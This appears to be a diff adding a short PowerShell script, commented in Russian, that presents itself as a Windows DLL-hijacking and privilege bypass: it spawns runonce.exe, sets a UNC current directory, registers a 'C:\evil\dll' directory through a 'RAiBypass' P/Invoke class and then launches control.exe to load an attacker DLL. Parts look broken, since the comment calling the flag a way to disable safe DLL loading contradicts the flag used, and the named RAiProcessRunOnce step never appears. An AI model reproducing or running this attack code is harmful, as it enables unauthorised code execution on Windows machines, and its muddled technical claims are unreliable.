@@ -1,0 +1,26 @@
+# 1. Создаем shadow process token
+$proc = Start-Process "runonce.exe" -ArgumentList "/AlternateShellStartup" -PassThru
+
+# 2. Меняем CurrentDirectory на UNC путь с контролируемой DLL
+$path = "\\127.0.0.1\C$\Windows\System32\"
+[System.IO.Directory]::SetCurrentDirectory($path)
+
+# 3. Через RAiProcessRunOnce загружаем DLL
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public class RAiBypass {
+    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
+    public static extern bool SetDefaultDllDirectories(int directoryFlags);
+    
+    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
+    public static extern void AddDllDirectory(string lpPathName);
+}
+"@
+
+# Отключаем безопасную загрузку DLL
+[RAiBypass]::SetDefaultDllDirectories(0x00001000) # LOAD_LIBRARY_SEARCH_DEFAULT_DIRS
+[RAiBypass]::AddDllDirectory("C:\evil\dll")
+
+# 4. Запускаем процесс, который загрузит нашу DLL
+Start-Process "control.exe" -ArgumentList "/name Microsoft.WindowsUpdate"
